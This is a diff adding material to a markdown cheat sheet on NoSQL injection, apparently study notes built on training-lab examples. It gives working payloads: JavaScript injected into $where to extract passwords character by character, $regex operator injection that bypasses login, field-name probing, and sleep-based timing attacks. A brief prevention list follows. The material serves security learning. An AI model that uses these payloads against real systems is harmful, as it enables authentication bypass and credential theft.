@@ -113,10 +113,76 @@ https://insecure-website.com/product/lookup?category=fizzy'+%26%26+1+%26%26+'x
 
 ## Extract data
 
+**INSIDE $WHERE**
+
+* Consider `https://insecure-website.com/user/lookup?username=admin`
+* This results in the following NoSQL query of the `users` collection: `{"$where":"this.username == 'admin'"}`
+* As the query uses the `$where` operator, you can attempt to inject JavaScript functions.
+  * `admin' && this.password[0] == 'a' || 'a'=='b`
+    * This returns the first character of the user's password string. You can go on...
+  * `admin' && this.password.match(/\d/) || 'a'=='b`
+    * Identify whether the password contains digits
+
+**INJECT OPERATOR (where)**
+
+* Consider `{"username":"wiener","password":"peter"}`
+* Add `$where` operator as an additional parameter. Send one true request and one false request.
+  * `{"username":"wiener","password":"peter", "$where":"0"}`
+  * `{"username":"wiener","password":"peter", "$where":"1"}`
+  * Different responses? This may indicate that the JavaScript expression in the `$where` clause is being evaluated\
 
 
-\
-\
+**INJECT OPERATOR (regex)**
+
+* Consider `{"username":"myuser","password":"mypass"}`
+  * `{"username":"myuser","password":"incorrect"}` (incorrect password)
+  * `{"username":"admin","password":{"$regex":"^.*"}}`
+  * Different responses? The app may be vulnerable
+* `{"username":"admin","password":{"$regex":"^a*"}}`
+  * Extract data character by character
+
+## Identify field names
+
+**FIRST WAY**
+
+* Send the payload for an existing field and for a field that doesn't exist.&#x20;
+* Example
+  * `admin' && this.username!='` (you know `username` field exists)
+  * `admin' && this.foo!='` (you know `foo` field exists)
+  * `admin' && this.password!='` (you want identify `password` field)
+    * `https://insecure-website.com/user/lookup?username=admin'+%26%26+this.password!%3d'`
+*   If the `password` field exists, you'd expect the response to be identical to the response for the existing field (`username`), but different to the response for the field that doesn't exist (`foo`).
+
+
+
+**SECOND WAY**
+
+* You can inject operator?
+  * `"$where":"Object.keys(this)[0].match('^.{0}a.*')"`
+  *   This inspects the first data field in the user object and returns the first character of the field name. You can extract the field name char by char
+
+      \
+
+
+## Timing based injection
+
+* Database error doesn't cause a difference in the application's response? Trigger a conditional time delay
+
+1. Load the page several times to determine a baseline loading time.
+2. Insert a timing based payload into the input. Example `{"$where": "sleep(5000)"}`
+3. Identify whether the response loads more slowly
+
+* Trigger a time delay if the password beings with the letter `a`
+  * `admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'`
+  * `admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'`
+
+## Prevention
+
+* Sanitize and validate user input, using an allowlist of accepted characters.
+* Insert user input using parameterized queries instead of concatenating user input
+*   To prevent operator injection, apply an allowlist of accepted keys.
+
+    \
 
 
 \
